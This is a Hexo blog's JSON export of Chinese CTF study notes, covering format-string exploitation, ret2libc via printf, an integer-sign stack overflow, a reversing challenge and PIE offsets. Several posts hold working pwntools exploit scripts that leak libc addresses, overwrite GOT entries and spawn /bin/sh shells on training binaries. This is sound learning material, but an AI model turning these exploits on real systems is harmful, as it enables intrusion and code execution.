{"meta":{"title":"Hexo","subtitle":"","description":"","author":"John Doe","url":"http://example.com","root":"/"},"pages":[{"title":"标签","date":"2025-07-21T01:52:05.551Z","updated":"2025-07-21T01:52:05.551Z","comments":true,"path":"categories/index.html","permalink":"http://example.com/categories/index.html","excerpt":"","text":""},{"title":"tags","date":"2025-07-21T01:51:03.000Z","updated":"2025-07-21T01:51:03.362Z","comments":true,"path":"tags/index.html","permalink":"http://example.com/tags/index.html","excerpt":"","text":""}],"posts":[{"title":"格式化字符串","slug":"格式化字符串","date":"2025-07-21T01:05:48.000Z","updated":"2025-07-21T13:35:26.315Z","comments":true,"path":"2025/07/21/格式化字符串/","permalink":"http://example.com/2025/07/21/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/","excerpt":"","text":"原理格式化字符串函数可以接受可变数量的参数，并将第一个参数作为格式化字符串，根据它解析之后的参数。 通俗来说，格式化字符串函数的作用是将计算机内存中的数据转化为人类可读的字符串格式。 一般来说，格式化字符串在利用的时候主要分为三个部分： (1）格式化字符串函数。 (2）格式化字符串。 (3）后续参数，可选。 用printf(&quot;name:%s,age:%d,salary:%4.2f&quot;,myname,myage, mysalary） printf函数叫作格式化字符串函数，”name:%s,age:%d,salary:%4.2f”叫作格式化字符串，“myname,myage,mysalary”叫作后续参数。 🧱 常见的格式化字符串符号 格式符 作用 示例 %x&#x2F;%p 以十六进制形式输出栈上的值 %x→0xdeadbeef %p通常带0x前缀 %d&#x2F;%u 以十进制输出栈上的值 %d→3735928559 %c 输出栈上值的最低一个字节 %c→&#39;A&#39; %s 把栈上的值当作地址，输出该地址的字符串 %s→&quot;Hello&quot; %hn 写入 2 字节（short） %hn→ 写入低 2 字节 %hhn 写入 1 字节（char） %hhn→ 写入低 1 字节 %n 将已输出字符数写入栈上的地址 %n→ 写入0x4到指定地址 %$p&#x2F;%%$s 指定第几个参数位置的值 %4$p→ 第 4 个参数 %% 输出一个%字符本身 %%→% 当用户控制了 printf() 的第一个参数（即格式化字符串），而程序没有进行过滤或限制，就可能造成以下问题： 123char input[100];fgets(input, sizeof(input), stdin);printf(input); // ⚠️ 危险！用户输入直接作为格式化字符串 此时，攻击者可以构造输入，如： %x %x %x %x %s 程序会尝试从栈中读取参数，但由于没有提供参数列表，printf() 会继续从栈中“猜测”数据。这可能导致： 泄露栈内存内容（如返回地址、canary、函数指针等） 写入内存（通过 %n 格式符） 虽然没有写任何参数，但还是会对应地解析参数，因为在格式化字符串中写了对应的解析方式，所以在后续的函数运行中会解析栈上的元 素。对于整型值和浮点值，这没有什么问题，不管栈上是什么数据都能够按照整型值和浮点值解析出来，而字符串形式就不一定能解析出来 了。如果是一个非法地址，比如NULL，那么在解析的时候就会报错， 因为这个地址按照字符串解析是无法解析出来的，程序就会崩溃。这就是格式化字符串漏洞的基本原理 利用leakmemory(泄露栈上内容) 用了 %100s 来防止缓冲区溢出，但并没有限制用户输入的格式符内容 。也就是说： 用户可以输入 %x、%s、%n 等格式符。 printf 会根据这些格式符从栈中“猜测”数据，从而造成信息泄露或任意地址写入。 leakmemory(泄露任意地址内存)这里的目标设立泄露isoc99_scanf函数（scanf编译之后是isoc99_scanf在内存中的地址）。 %k$s 这里的p是可以更换的，比如更换为s就可以解析栈上的数据为字符串。 k：表示要打印的参数距离目前格式化字符串参数的距离。 因为在没有给printf提供对应的字符，但它是一个可变参数函数 ，它会从栈上依次读取数据来填充格式化字符串中的 %p、%x、%s、%n 等指令。 但你并不知道你输入的字符串在栈上的具体位置，所以你需要： 找到你的输入字符串在栈上的偏移量，才能精准控制读写的内容。 所以偏移量就是4 所以构造payload &#x3D; p32(scanf_got) + “%4$s” 相当于print(p32(scanf_got) + “%4$s”) 所以前四个字节是输出的scanf的got表 🧠 关键区别：地址 vs 地址的内容 scanf_got GOT 表中scanf的地址（.got段中的一个位置） 0x804a008 就像书的目录页码 泄露的地址（leak_addr） 这个 GOT 表项中存储的值（即scanf的实际地址） 0xf7e01234 就像目录页码指向的那一页的内容 脚本1234567891011121314from pwn import *p = process(&quot;./leakmemory&quot;)elf = ELF(&quot;./leakmemory&quot;)#gdb.attach(p,&quot;b printf&quot;)scanf_got = elf.got[&quot;__isoc99_scanf&quot;]payload=p32(scanf_got)+b&quot;%4$s&quot;p.sendline(payload)leak_addr = u32(p.recv(8)[4:])scanf_addr = leak_addrlog.success(&quot;scanf_addr:&quot; + hex(scanf_addr))p.interactive() printf 执行流程： printf 会从栈上读取参数； 它看到 %4$s，会从第 4 个参数位置读取一个地址； 这个地址是 0x804a018（你写入的 GOT 地址）； 然后从 0x804a018 地址中读出一个指针（比如 0xf7e01234，即 scanf 的运行时地址）； %s 会从 0xf7e01234 开始读取字符串，直到遇到 \\0； 最终你接收到的数据中包含 0xf7e01234。 📌 总结 elf.got[&quot;scanf&quot;]和elf.got[&quot;__isoc99_scanf&quot;]一样吗？ 不一定，取决于编译器 为什么会有__isoc99_scanf？ GCC 编译器为了支持 C99 标准引入的 怎么确认用哪个？ 用readelf -r或objdump -TR查看 GOT 表 能不能替换？ 只有 GOT 表中存在对应符号时才能替换 如果写错了会怎样？ 报错：KeyError 函数调用完整过程🌟 阶段 0️⃣：在 vulnfunc 里（调用 printf 之前） 这是已经在 vulnfunc 里，且栈帧已经建立好了。 栈顶在 esp，栈低在高地址方向。 12345678910111213 ↑ 高地址──────────────────────────────| 参数n（可能是命令行参数） || 参数2 || 参数1 |──────────────────────────────| 返回地址 → main |──────────────────────────────| 上一个 ebp | ← ebp (vulnfunc 的 ebp)──────────────────────────────| vulnfunc 局部变量 || … | ← esp （在 vulnfunc 里） ↓ 低地址 当你刚进入 vulnfunc： ebp → 上一个 ebp ebp+4 → 返回地址（返回到 main） ebp-xx → vulnfunc 的局部变量 esp → 最低处，指向局部变量 🌟 阶段 1️⃣：调用 printf(format) 当 vulnfunc 调用： 12printf(format); 调用者把返回地址 &amp; 参数压入栈： 1234567891011121314 ↑ 高地址──────────────────────────────| 参数n（main 的参数） || … |──────────────────────────────| 返回地址 → main |──────────────────────────────| 上一个 ebp | ← ebp (vulnfunc)──────────────────────────────| vulnfunc 局部变量 |──────────────────────────────| 参数1=format | ← esp+4| 返回地址 → vulnfunc+下一条 | ← esp ↓ 此时 esp 指向 printf 的返回地址，再往上是 printf 的参数。 🌟 阶段 2️⃣：进入 printf 后 在 printf 开始执行后，它建立自己的栈帧： 1234567891011121314151617 ↑ 高地址──────────────────────────────| 参数n（main 的参数） || … |──────────────────────────────| 返回地址 → main |──────────────────────────────| 上一个 ebp | ← ebp (vulnfunc)──────────────────────────────| vulnfunc 局部变量 |──────────────────────────────| 参数1=format | ← ebp+8| 返回地址 → vulnfunc+下一条 | ← ebp+4| 上一个 ebp | ← ebp (printf)──────────────────────────────| printf 局部变量 | ← esp ↓ 这里： printf 把当前的 ebp 压栈 把 ebp 设置为 esp esp 再向下留出局部变量空间 scanf函数会把读取到的数放在栈上一个空间，然后%p会把它泄露出来 使用 scanf 读取一个字符串（最多 100 字节），存入 format 缓冲区； 然后直接将这个字符串作为参数传给 printf，即：printf(format); overwrite(覆盖任意地址内存) 所以这道题的重点是修改几个数的值 1）将a覆盖为0x10。 2）将b覆盖为2。 3）将c覆盖为0x12345678。 其中a是局部变量，b,c是全局变量 局部变量存储在栈上，全局变量存储在数据段中（分为已初始化rodata和未初始化bss两部分） 12345678910111213141516171819202122232425262728+---------------------+ &lt;--- 高内存地址| 命令行参数 &amp; 环境变量 |+---------------------+| 栈 (Stack) | &lt;-- 局部变量、函数参数、返回地址| || Function Call N || (局部变量, 返回地址等)|| Function Call 2 || (局部变量, 返回地址等)|| Function Call 1 || (局部变量, 返回地址等)|| ... || || 空闲 || |+---------------------+| 堆 (Heap) | &lt;-- 动态分配内存 (malloc/new)| || ... |+---------------------+| .bss 段 (未初始化数据) | &lt;-- 未初始化的全局变量和静态变量 (例如: b)+---------------------+| .data 段 (已初始化数据) | &lt;-- 已初始化的全局变量和静态变量 (例如: c)+---------------------+| .text 段 (代码) | &lt;-- 程序执行代码 (指令)+---------------------+| 保留区域 |+---------------------+ &lt;--- 低内存地址 a的处理（局部变量）首先，a是局部变量，局部变量是存储在栈上的，其地址会因为开启ASLR而变化，所以在函数中将a的地址打印出来了 脚本 12345678from pwn import *p=process(&quot;./overwrite&quot;)a=int(p.recvuntil(&#x27;\\n&#x27;,drop=True),16)print(hex(a))payload=p32(a)+b&quot;%12c&quot;+b&quot;%8$n&quot;p.sendline(payload)m=p.recv()print(m) int和u32() 函数 int(..., 16) 接收到的是字符串形式的地址（如&quot;0xffa79dbc&quot;） 转换为整数地址 主动泄露地址 u32(...) 接收到的是原始 4 字节数据（如b&#39;\\xbc\\x9d\\xa7\\xff&#39;） 将小端序的 4 字节转为整数 调用泄露地址 🧩 p32(a_addr) 是怎么用的？ 构造的 p32(a_addr) 会被 printf 当作一个参数处理： 它被压入栈上； %8$n 会从第 8 个参数位置读取它； 这个地址就是写入的目标地址。 🧩 %12c 是怎么用的？（目标是16，a的地址占四个字节） %12c 输出 12 个字符（如空格）； %n 会把当前输出的字符总数写入指定地址； 所以 %12c 的作用是让 %n 写入 12； 它本身不写入内存，但会影响 %n 的值。 不能换成b’a’*12,这个不会影响%n的总数 工作原理： 当 printf(payload) 执行时，payload 字符串会被放到栈上。 printf 开始解析 payload。它会把 p32(a_addr) 视为一个普通的字符串（但它实际上是 v1 的地址）。 然后遇到 %12c，它输出 12 个字符。 接着遇到 %8$n。此时 printf 已经输出了 12 个字符。它会去栈上寻找第 8 个参数的地址。由于 p32(a_addr) 放在了 payload 的开头，并且其长度是 4 字节，它会正好落在栈上第 8 个参数的位置上（这个偏移量是经过调试确定的）。 printf 会将当前已输出的字符数 12 写入到 p32(a_addr) 所表示的地址，也就是局部变量 v1 的地址。 最终，v1 的值被修改为 12。 b的处理（全局小数） b,c的地址可以直接找到 脚本 1234567891011121314from pwn import *p = process(&quot;./overwrite&quot;)elf = ELF(&quot;./overwrite&quot;)#gdb.attach(p,&quot;b printf&quot;)a=int(p.recvuntil(&quot;\\n&quot;,drop=True),16)print(hex(a))b=0x0804A028payload=b&#x27;aa&#x27;+b&#x27;%10$n&#x27;+b&#x27;b&#x27;+p32(b)p.sendline(payload)info=p.recvline()if b&quot;overwrite b for a small value&quot; in info: print(b&quot;Success\\n&quot;)p.interactive() 为什么不能按照覆盖 a 的方法？（因为%n，b的地址已经超过2了，所以b的地址只能在%_$n之后） 偏移量计算的差异： 在覆盖 a 的方法中，p32(a_addr) 放在了 payload 的最开头，并且 printf 发现这个开头在它的参数列表中是第 8 个。 但是，如果将 p32(b_addr) 也放在 payload 的开头并尝试用 %8$n 写入，可能会遇到问题： 地址值与格式符冲突：0x0804A028 这个地址本身如果被 printf 解析成格式化字符串的一部分，可能会包含 % 或其他特殊字符，导致 printf 崩溃或行为异常。例如，地址的某个字节可能被解释为 %s 或 %x 的一部分，导致 printf 试图读取无效的内存地址。 控制性问题：我们通常希望将要写入的地址放在格式字符串的末尾，这样它就不会被 printf 误认为是格式符的一部分来处理，而只是一个普通的 4 字节数据。 特性 覆盖 v1 (局部变量) 覆盖 b (全局变量) 目标类型 栈上的局部变量 数据段上的全局变量 地址来源 运行时泄露 (每次可能不同) 静态固定 (编译时确定) p32(addr) 位置 放在 payload 的开头 放在 payload 的末尾 %n 偏移 8$ (因为地址放在开头，且在第 8 个参数位置) 10$ (因为地址放在末尾，且在第 10 个参数位置) 主要考量 确保 p32(addr) 不被误解为格式符，且在正确偏移 避免 b_addr 字节被误解为格式符，更稳定地作为参数地址 好的，如果你确认这个 b 是必须的，那么它在 payload 中的存在，就意味着它在栈的布局和 printf 对参数的解析中起到了关键作用，通常是保证了 p32(b_addr) 的正确对齐，使其落在 %10$n 预期的参数位置。 让我们来详细分析，为什么多一个 b 反而可能成为“必须的”。 有 b 的详细分析 1payload = b&quot;aa&quot; + b&quot;%10$n&quot; + b&quot;b&quot; + p32(b_addr) 让我们计算每个部分的长度： b&quot;aa&quot;：2 字节 b&quot;%10$n&quot;：5 字节 b&quot;b&quot;：1 字节 p32(b_addr)：4 字节 (假设 b_addr 是 0x0804A028) 总字节数 &#x3D; 2 + 5 + 1 + 4 &#x3D; 12 字节,在这里，b是为了补足字节 c的处理（全局大数） 这是一个很大的数，考虑逐字节写入 这里想把c覆盖为0x12345678，而c的地址是0x0804A02C，所以基本目标是： 12340x0804A02C:\\x780x0804A02D:\\x560x0804A02E:\\x340x0804A02F:\\x12 脚本 1234567891011121314from pwn import *p=process(&quot;./overwrite&quot;)a=int(p.recvuntil(&quot;\\n&quot;,drop=True),16)print(hex(a))c=0x0804A02Cpayload=fmtstr_payload(offset=8,writes=&#123;c:0x12345678&#125;)p.sendline(payload)info =p.recvline()if b&quot;overwrite c for a big value&quot; in info: print(b&quot;Success&quot;)p.interactive() fmtstr_payloadfmtstr_payload 是 pwntools 提供的一个自动化工具 ，用于构造格式化字符串漏洞（Format String Vulnerability）的 payload 。 它的作用是： 自动计算字符数并构造 payload，用于写入任意地址的值（如 GOT 表、变量、返回地址等） 🧪 fmtstr_payload 的使用方法 基本语法 12from pwn import *fmtstr_payload(offset, writes, numbwritten=0, write_size=&#x27;byte&#x27;) 参数说明 offset 格式化字符串偏移量（你的输入在第几个%p的位置） writes 一个字典，表示你要写入的地址和值，如&#123;addr1: value1, addr2: value2&#125; numbwritten 已经输出的字符数（默认为 0，可以忽略） write_size 写入大小，可选：&#39;byte&#39;、&#39;short&#39;、&#39;int&#39;（默认是&#39;byte&#39;） 🧩 示例 1：写入一个地址为 16 123456789101112from pwn import *elf = ELF(&quot;./vuln&quot;)offset = 8 # 偏移量addr = elf.symbols[&#x27;a&#x27;] # 假设你要写入变量 a 的地址# 构造 payload：写入 a = 16payload = fmtstr_payload(offset, &#123;addr: 16&#125;)p = process(&quot;./vuln&quot;)p.sendline(payload)p.interactive() 🧩 示例 2：写入多个地址（如 a=16, b=2, c=0x12345678） 12345678910111213141516171819from pwn import *elf = ELF(&quot;./vuln&quot;)offset = 8a_addr = elf.symbols[&#x27;a&#x27;]b_addr = elf.symbols[&#x27;b&#x27;]c_addr = elf.symbols[&#x27;c&#x27;]# 构造 payload：写入多个地址writes = &#123; a_addr: 16, b_addr: 2, c_addr: 0x12345678&#125;payload = fmtstr_payload(offset, writes, write_size=&#x27;int&#x27;)p = process(&quot;./vuln&quot;)p.sendline(payload)p.interactive() fmt_demo（格式化字符串的综合利用） 所以可以先泄露libc的基址，得到system函数的地址 太根据此把printf的got表存储的地址换为system函数的地址 之后输入参数“&#x2F;bin&#x2F;sh”,就可以实现 脚本 12345678910111213141516171819202122from pwn import *from LibcSearcher import LibcSearcherp=process(&quot;./fmt_demo&quot;)elf=ELF(&quot;./fmt_demo&quot;)read_got=elf.got[&quot;read&quot;]payload=p32(read_got)+b&quot;%4$s&quot;p.send(payload.ljust(0x100,b&quot;\\x00&quot;))read=u32(p.recv(8)[4:])print(hex(read))libc=LibcSearcher(&quot;read&quot;,read)libc_base=read-libc.dump(&quot;read&quot;)system=libc_base+libc.dump(&quot;system&quot;)payload=fmtstr_payload(offset=4,writes=&#123;elf.got[&quot;printf&quot;]:system&#125;)p.sendline(payload.ljust(0x100,b&quot;\\x00&quot;))bin=b&quot;/bin/sh&quot;p.sendline(bin.ljust(0x100,b&quot;\\x00&quot;))p.interactive() 那为什么还要填补 payload 的长度为 0x100 字节？” 我们来从 “payload 被复制到栈上” 这个现象出发，解释为什么我们有意地 将 payload 填充到固定长度（如 0x100 字节），尽管它可能会被复制到栈上。 ✅ 简短回答： 我们填补 payload 到固定长度（如 0x100 字节），是为了让 payload 被完整复制到栈上，从而让偏移固定、布局可控，便于利用格式化字符串漏洞进行地址泄露或写入操作。 📌 payload 的两种“命运”： 1️⃣ payload 短 &lt; 一些参数长度 printf从栈上读取参数 payload 在 buf 中，参数在栈上 2️⃣ payload 长 &gt; 一定长度（如 100 字节） printf把 payload 复制到栈上 payload 本身就在栈上 🧩 为什么要“故意”让 payload 被复制到栈上？ ✅ 优点一：偏移固定，便于调试 payload 被复制到栈上后，它在栈上的位置是固定的。 我们可以精准控制偏移（比如 %4$s 就一定读取 payload 中的地址）。 避免了因 payload 长度不同导致偏移变化的问题。 ✅ 优点二：便于构造写入操作（如 %n） 当我们想用 %n 写某个地址时，需要确保地址在栈上，且偏移固定。 如果 payload 被复制到栈上，我们就可以把地址放在 payload 开头，然后用 %1$n 精准写入。 ✅ 优点三：防止 payload 被截断或偏移漂移 如果 payload 长度不固定，可能导致偏移变化，%s、%n 读写错误地址。 填充到固定长度（如 0x100）可以避免这种漂移。 :grey_question:但我其实不太理解","categories":[],"tags":[{"name":"pwn_study","slug":"pwn-study","permalink":"http://example.com/tags/pwn-study/"}]},{"title":"ret2libc-printf","slug":"HarekazeCTF2019-baby-rop2","date":"2025-07-20T06:53:58.000Z","updated":"2025-07-20T09:27:47.719Z","comments":true,"path":"2025/07/20/HarekazeCTF2019-baby-rop2/","permalink":"http://example.com/2025/07/20/HarekazeCTF2019-baby-rop2/","excerpt":"","text":"严格符合printf的格式[HarekazeCTF2019]baby_rop2 而且函数中没有system函数和相应字符串 要泄露libc的地址 通过read读取数据，用printf打印出来 printf 函数的 GOT 地址不能用来泄露 printf 自己的地址？ 是的，这是个鸡生蛋蛋生鸡 的问题： printf@got 保存的是 printf 的真实地址（libc 中的地址）。 但你要调用 printf 才能打印它，而调用 printf 又依赖 GOT 表项的地址。 如果 GOT 表项还没解析（延迟绑定），它指向 PLT stub，不是真实地址。 即使 GOT 表项已解析，你也无法通过 printf(&quot;%s&quot;, printf_got) 正确读取地址。 🧠 总结对比 puts(puts_got) ✅ 可行 puts会尝试打印从puts_got开始的内容，libc 中有字符串，不会崩溃 printf(&quot;%s&quot;, printf_got) ❌ 不可行 printf会尝试从printf_got地址读取字符串，但那是个函数地址，不是字符串 printf(&quot;%p&quot;, printf_got) ✅ 可行（需构造） 可以打印地址，但需要正确设置格式字符串 printf(&quot;%s&quot;, read_got) ✅ 可行（偶尔） read_got指向的地址附近可能有字符串，可以打印出来 puts(printf_got) ✅ 可行（偶尔） 同上，但依赖 libc 中的字符串 要调用printf函数进行泄露，就要根据其特性来传参，printf函数有两个参数，一个格式化字符串，一个可变参数列表 RDI、RSI、RDX、RCX、R8、R9参数按照这个顺序传入寄存器中 有单独的rdi 所以rdi&#x3D;0x400733 但没有单独对rsi的处理 所以rsi_r15&#x3D;0x400731，对r15随便传入一个数就可 第一次payload的构造 12345678910payload = b&#x27;a&#x27;*0x28+p64(pop_rdi)+p64(format_str)payload+=p64(pop_rsi_r15)+p64(read_got)+p64(0)payload+=p64(printf_plt)+p64(main_plt)p.recvuntil(b&quot;name? &quot;)p.sendline(payload)read= u64(p.recvuntil(b&quot;\\x7f&quot;)[-6:] + b&#x27;\\0\\0&#x27;)print(hex(read)) 第二次通过计算出libc的基址，加上偏移量就得到了需要的函数的地址，就可与i进行构造了 1payload = b&#x27;a&#x27;*0x28+p64(pop_rdi)+p64(bin_sh)+p64(sys_addr) 脚本 123456789101112131415161718192021222324252627282930313233343536from pwn import *from LibcSearcher import *context.log_level = &#x27;debug&#x27;#p = process(&#x27;./babyrop2&#x27;)p = remote(&quot;node5.buuoj.cn&quot;,25235)elf = ELF(&#x27;./babyrop2&#x27;)pop_rdi = 0x0000000000400733pop_rsi_r15 = 0x0000000000400731 format_str = 0x0000000000400770 ret_addr = 0x0000000000400734printf_plt = elf.plt[&#x27;printf&#x27;]read_got = elf.got[&#x27;read&#x27;]main_plt = 0x400636payload = b&#x27;a&#x27;*0x28+p64(pop_rdi)+p64(format_str)payload+=p64(pop_rsi_r15)+p64(read_got)+p64(0)payload+=p64(printf_plt)+p64(main_plt)p.recvuntil(b&quot;name? &quot;)p.sendline(payload)read= u64(p.recvuntil(b&quot;\\x7f&quot;)[-6:] + b&#x27;\\0\\0&#x27;)print(hex(read))libc = LibcSearcher(&#x27;read&#x27;, read)libc_base = read - libc.dump(&#x27;read&#x27;)sys_addr = libc_base + libc.dump(&#x27;system&#x27;)bin_sh = libc_base + libc.dump(&#x27;str_bin_sh&#x27;)payload = b&#x27;a&#x27;*0x28+p64(pop_rdi)+p64(bin_sh)+p64(sys_addr)p.sendline(payload)p.interactive() 单个函数pwn2_sctf_2016 首先看到题目输入一个小于32的数，并把这个数当作get输入的最大限制 所以可以输入一个负数来解决这个限制 也是没有system函数的相关内容 考虑泄露libc的地址 :detective:用printf打印，可以用printf的got表、 因为你调用了 printf(printf_got)。 对于 printf 来说： 它看不到这是一个整数地址 它只是把你给的指针当作一个字符串格式解析 如果你传入的这个地址是可读的内存，它就会按照那块内存的内容当作字符串去输出 所以如果只是传一个参数，printf函数会刚好把它当作字符串 刚好解决了传递它本身的got表地址，和只有一个参数的问题 1payload=b&#x27;a&#x27; * (0x2c+4) + p32(printf_plt) + p32(main) + p32(printf_got) 之后就是标准流程 就是记得返回地址是main函数 要再次输入依次那个负数 脚本 123456789101112131415161718192021222324252627282930from pwn import *from LibcSearcher import *from time import sleepr = remote(&quot;node5.buuoj.cn&quot;,28640)elf = ELF(&#x27;./pwn2_sctf_2016&#x27;)printf_plt = elf.plt[&#x27;printf&#x27;]printf_got = elf.got[&#x27;printf&#x27;]main= elf.sym[&#x27;main&#x27;]r.recvuntil(b&#x27;read?&#x27;)r.sendline(b&#x27;-1&#x27;)r.recvuntil(b&quot;data!\\n&quot;)payload = b&#x27;a&#x27; * (0x2c+4)payload += p32(printf_plt) + p32(main) + p32(printf_got)r.sendline(payload)r.recvuntil(&#x27;\\n&#x27;)printf_addr=u32(r.recv(4))#接受libc = LibcSearcher(&#x27;printf&#x27;,printf_addr)base = printf_addr - libc.dump(&#x27;printf&#x27;)system_addr = base + libc.dump(&#x27;system&#x27;)bin_sh = base + libc.dump(&#x27;str_bin_sh&#x27;)r.recvuntil(b&#x27;How many bytes do you want me to read?&#x27;)r.sendline(b&#x27;-1&#x27;)r.recvuntil(b&quot;data!\\n&quot;)payload = b&#x27;a&#x27; * (0x2c+4) + p32(system_addr) + p32(main) + p32(bin_sh)r.sendline(payload)r.interactive()","categories":[],"tags":[{"name":"PWN","slug":"PWN","permalink":"http://example.com/tags/PWN/"},{"name":"BUU","slug":"BUU","permalink":"http://example.com/tags/BUU/"},{"name":"ret2libc_printf","slug":"ret2libc-printf","permalink":"http://example.com/tags/ret2libc-printf/"}]},{"title":"ciscn_2019_es_2","slug":"ciscn-2019-es-2","date":"2025-07-18T11:03:47.000Z","updated":"2025-07-18T12:19:36.079Z","comments":true,"path":"2025/07/18/ciscn-2019-es-2/","permalink":"http://example.com/2025/07/18/ciscn-2019-es-2/","excerpt":"","text":"每次只能读取0x30个字符，到ebp的距离是0x28，差比较小，不方便构造rop链， system_addr&#x3D;0x80048400","categories":[],"tags":[{"name":"PWN","slug":"PWN","permalink":"http://example.com/tags/PWN/"},{"name":"BUU","slug":"BUU","permalink":"http://example.com/tags/BUU/"},{"name":"printf","slug":"printf","permalink":"http://example.com/tags/printf/"}]},{"title":"bjdctf_2020_babystack2","slug":"bjdctf-2020-babystack2","date":"2025-07-18T09:18:45.000Z","updated":"2025-07-18T09:30:00.120Z","comments":true,"path":"2025/07/18/bjdctf-2020-babystack2/","permalink":"http://example.com/2025/07/18/bjdctf-2020-babystack2/","excerpt":"","text":"只有nx保护 read是栈溢出漏洞 且函数中存在后门函数 分析主函数 输入长度nbytes（要求小于10） 但是观察到后面的read函数最多读取nbytesg个字节到buf中 10个字节无法实现栈溢出覆盖返回地址 又观察到 (unsigned int)nbytes是无符号整数，所以用负数会转化为无穷大的值 脚本 1234567891011from pwn import *#p=process(&quot;./bjdctf_2020_babystack2&quot;)#gdb.attach(p,&quot;b*0x400826&quot;)p=remote(&quot;node5.buuoj.cn&quot;,28556)p.recvuntil(b&quot;name:\\n&quot;)p.sendline(str(-1))p.recvuntil(b&quot;name?\\n&quot;)exit=0x6010b8payload=b&#x27;a&#x27;*(0x10+8)+p64(0x400726)p.sendline(payload)p.interactive()","categories":[],"tags":[{"name":"PWN","slug":"PWN","permalink":"http://example.com/tags/PWN/"},{"name":"BUU","slug":"BUU","permalink":"http://example.com/tags/BUU/"},{"name":"栈溢出","slug":"栈溢出","permalink":"http://example.com/tags/%E6%A0%88%E6%BA%A2%E5%87%BA/"}]},{"title":"Youngter-drive","slug":"Youngter-drive","date":"2025-07-17T12:30:33.000Z","updated":"2025-07-18T01:22:32.276Z","comments":true,"path":"2025/07/17/Youngter-drive/","permalink":"http://example.com/2025/07/17/Youngter-drive/","excerpt":"","text":"可以看出是一个多线程 线程分析1::hObject = CreateMutexW(0, 0, 0); 目的： 创建一个 Mutex（互斥锁），线程之间访问共享资源时用它来保护数据。 两个线程都会读写全局变量，比如 Dest（flag 存放的地方）、len。 如果两个线程同时写入&#x2F;读写，会造成数据错乱，所以需要互斥锁来同步。 当一个线程拿到 Mutex 后，另一个线程必须等它释放 Mutex 才能进入关键区。 12hObject = CreateThread(0, 0, StartAddress, 0, 0, 0);Thread = CreateThread(0, 0, sub_41119F, 0, 0, 0); 创建线程，第三个参数是改线程要执行的函数的函数入口 12CloseHandle(hObject);CloseHandle(Thread); 关闭线程句柄（只是释放句柄资源） 线程本身依然在后台运行，等它们的函数返回时，线程自然结束。 （注意：这里关闭的是句柄，不是线程本身） 1CloseHandle(::hObject); 释放资源 结束 主线程 像 导演，负责协调整个流程： 让用户输入 flag（sub_4110FF）。 创建两个“工人”（线程1和线程2）： 工人1（加密线程）：对 flag 进行加密。 工人2（轮数控制线程）：控制加密的轮数。 导演等待工人完成任务（while (len != -1)）。 工人完成后，导演输出结果（sub_411190）。 函数分析StartAddress 可以看到每次执行时len会减1 打开后可以看到是一个加密操作 a1时我们输入的flag,a2待会儿分析得到他是29 分析得到 倒着，从flag的最后一位开始，分为两种加密，为小写字符和非小写字母时 sub_41119F 只减少len,不改变字符 len数值 看着后面的标注可以看到0x1D是29，刚好等于后面的标注TOiZiZtOrYaToUwPnToBsOaOapsyS的长度 可以猜想这个len相当于密文的下标 且加密后的数值是 flag有30位 脚本思路，把TOiZiZtOrYaToUwPnToBsOaOapsyS逆回去 不知道是技奇数位还是偶数位，i %2 &#x3D;&#x3D; 1也尝试一下 脚本 123456789101112131415161718192021off_418000 = &quot;QWERTYUIOPASDFGHJKLZXCVBNMqwertyuiopasdfghjklzxcvbnm&quot;off_418004 = &quot;TOiZiZtOrYaToUwPnToBsOaOapsyS&quot;print(len(off_418004))flag=&#x27;&#x27;for i in range(len(off_418004)): if i %2 == 0: flag += off_418004[i] continue for j,k in enumerate(off_418000): if off_418004[i] == k: if chr(j+38).isupper(): flag += chr(j+38) else: flag += chr(j+96)print(flag)print(chr(off_418000[29]))#ThisisthreadofwindowshahaIsES 输出了29个字符 而对字符串的操作是操作了30位的（0到29），所以最后一位可能需要我们猜测，把每个字母都 猜一遍（可以用代码写，用字符串拼接函数） 最终flag： 1flag&#123;ThisisthreadofwindowshahaIsESE&#125;","categories":[],"tags":[{"name":"RE","slug":"RE","permalink":"http://example.com/tags/RE/"},{"name":"BUU","slug":"BUU","permalink":"http://example.com/tags/BUU/"},{"name":"猜数","slug":"猜数","permalink":"http://example.com/tags/%E7%8C%9C%E6%95%B0/"}]},{"title":"[NISACTF 2022]ezpie","slug":"NISACTF-2022-ezpie","date":"2025-07-16T05:35:49.000Z","updated":"2025-07-16T07:49:11.027Z","comments":true,"path":"2025/07/16/NISACTF-2022-ezpie/","permalink":"http://example.com/2025/07/16/NISACTF-2022-ezpie/","excerpt":"","text":"开启了pie保护 但程序会输出main函数的地址 且程序中存在bin&#x2F;sh段 又因为虽然 PIE 开启后程序基地址随机化，但函数之间的 相对偏移是固定的 所以可以通过计算main和system函数之间的偏移量来得到system函数的地址 🔍 方法一：使用 readelf -s 查看符号表 如果程序有符号信息（即未 strip），可以用： 1readelf -s + your_binary ​ 5: 0000000000000678 34 FUNC GLOBAL DEFAULT 11 main ​ 6: 0000000000000700 20 FUNC GLOBAL DEFAULT 11 system system_offset_from_main &#x3D; 0x700 - 0x678 &#x3D; 0x88 但对于这道题目，程序被 strip 掉了符号，找不到system函数的地址 🧠 方法二：用 GDB 动态调试（适用于没有符号的情况） 如果你的程序被 strip 掉了符号，无法用 readelf 找到 main 和 system 的地址，可以用 GDB 动态调试： 步骤如下： 启动 GDB 并加载程序： bash 1 gdb .&#x2F;your_binary 查看 main 地址： gdb 1 p main 输出示例： 1 $1 &#x3D; {int (int, char **, char **)} 0x555555555678 查看 system 地址： gdb 1 p system 输出示例： 1 $2 &#x3D; {&lt;text variable, no debug info&gt;} 0x555555555700 计算偏移： 1 0x555555555700 - 0x555555555678 &#x3D; 0x88 所以偏移还是 0x88。 🛠 方法三：用 IDA Pro &#x2F; Ghidra 查看函数地址在反汇编工具中查看： 找到 main 函数起始地址（比如 sub_1234） 找到 system 函数地址（可能在 .plt 或 .got.plt 中） 计算两者之间的差值即可 🧪 实战应用流程总结假设你在远程连接中得到了 main 的运行时地址为 0x7ffff7a55678，你想调用 system(&quot;/bin/sh&quot;)。 步骤： 本地查出： main 偏移为 0x678 system 偏移为 0x700 所以 system_offset_from_main = 0x88 远程泄露得到的 main_runtime_address = 0x7ffff7a55678 计算 system_runtime_address： python 1 system_addr &#x3D; main_addr + system_offset_from_main 即： python 1 system_addr &#x3D; 0x7ffff7a55678 + 0x88 &#x3D; 0x7ffff7a55700 这样你就拿到了 system 的地址！ 📌 补充说明 如果 system 不在 .text 段而是 PLT&#x2F;GOT，你需要使用 GOT 泄露来获取其真实地址。 本方法只适用于 system 是静态链接进程序中的情况（即没有 strip 掉，或你有符号信息）。 